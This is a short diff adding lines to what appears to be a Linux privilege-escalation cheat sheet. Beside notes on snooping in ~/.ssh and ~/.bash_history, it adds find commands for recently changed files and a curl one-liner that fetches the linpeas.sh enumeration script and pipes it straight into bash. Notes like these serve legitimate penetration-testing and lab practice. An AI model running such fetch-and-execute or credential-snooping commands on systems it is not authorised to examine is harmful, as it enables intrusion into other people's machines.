@@ -107,3 +107,9 @@ Other places to snoop around in: ~/.bash_history , ~/.ssh , ~/.profile , /etc/up
 
 `uname -a` or `cat /proc/version` can give details about the system
 
+`find / -cmin -60` finds files changed within the last hour
+
+`find / -amin -60` finds files accessed within the last hour
+
+`curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash | tee linpeas_output.txt` for linpeas
+
